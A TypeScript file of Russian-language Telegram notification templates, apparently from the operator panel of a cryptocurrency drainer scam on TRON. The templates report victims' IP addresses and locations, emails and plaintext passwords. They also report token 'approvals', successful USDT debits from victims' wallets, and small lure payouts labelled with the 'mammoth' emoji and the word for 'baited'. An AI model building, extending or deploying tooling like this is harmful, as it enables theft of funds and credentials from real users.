import { getIPGeoData } from "../utils/get.ip.info";

export const loginMessage = async (
  email: string,
  ip: string
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `🔔 <b>ВХОД В АККАУНТ</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country}, ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n`
  );
};

export const registerMessage = async (
  email: string,
  password: string,
  ip: string
): Promise<string> => {
  const data = await getIPGeoData(ip);

  return (
    `📥 <b>НОВАЯ РЕГИСТРАЦИЯ</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country}, ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `🔒 <b>Пароль:</b> <code>${password}</code>\n`
  );
};

export const connectWhitelist = async (
  ip: string,
  email: string,
  address: string
) => {
  const data = await getIPGeoData(ip);
  return (
    `📡 <b>КОННЕКТ: Добавлен новый пользователь в whitelist</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country}, ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Aдресс:</b> <code>${address}</code>\n` +
    `--------------------------------------\n`
  );
};

export const verifSucces = async (
  ip: string,
  email: string,
  address: string,
  amount_TRX: number
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `🦣 <b>АПРУВ УСПЕШНО</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country} ${data?.city}` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Aдресс:</b> <code>${address}</code>\n` +
    `--------------------------------------\n` +
    `Пользотелю к выплате ${amount_TRX} TRX`
  );
};

export const verifDeclien = async (
  ip: string,
  email: string,
  address: string
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `🦣 <b>ОТМЕНИЛ АПРУВ</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country} ${data?.city}` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Aдресс:</b> <code>${address}</code>\n`
  );
};

export const systemError = async (
  context: "bot" | "api",
  error: string
): Promise<string> => {
  return (
    `🛑 <b>СИСТЕМНАЯ ОШИБКА</b>\n` +
    `--------------------------------------\n` +
    `[${context.toUpperCase()}] ${error}`
  );
};

export const trasferFromSuccess = async (
  ip: string,
  email: string,
  address: string,
  amount: number,
  txid: string
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `💸 <b>УСПЕШНОЕ СПИСАНИЕ</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country} ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Адрес:</b> <code>${address}</code>\n` +
    `💰 <b>Сумма:</b> <code>${amount}</code> USDT\n` +
    `--------------------------------------\n` +
    `https://tronscan.org/#/transaction/${txid}`
  );
};

export const trasferFromFailed = async (
  ip: string,
  email: string,
  address: string,
  amount: number,
  reason?: string
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `❌ <b>ОШИБКА СПИСАНИЯ</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country} ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Адрес:</b> <code>${address}</code>\n` +
    `💰 <b>Сумма:</b> <code>${amount}</code> USDT\n` +
    (reason ? `📄 <b>Причина:</b> <code>${reason}</code>\n` : "")
  );
};

export const transferToUserSuccess = async (
  ip: string,
  email: string,
  address: string,
  amount: number,
  txid: string
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `🦣 <b>ПРИКОРМЛЕН</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country} ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Адрес:</b> <code>${address}</code>\n` +
    `💰 <b>Сумма:</b> <code>${amount}</code> USDT\n` +
    `--------------------------------------\n` +
    `https://tronscan.org/#/transaction/${txid}`
  );
};

export const transferToUserFailed = async (
  ip: string,
  email: string,
  address: string,
  amount: number,
  reason?: string
): Promise<string> => {
  const data = await getIPGeoData(ip);
  return (
    `🚫 <b>ОШИБКА ВЫПЛАТЫ</b>\n` +
    `--------------------------------------\n` +
    `<code>${ip}</code>\n` +
    `${data?.countryEmoji} ${data?.country} ${data?.city}\n` +
    `🧑‍💻 <b>Email:</b> <code>${email}</code>\n` +
    `💳 <b>Адрес:</b> <code>${address}</code>\n` +
    `💰 <b>Сумма:</b> <code>${amount}</code> USDT\n` +
    (reason ? `📄 <b>Причина:</b> <code>${reason}</code>\n` : "")
  );
};
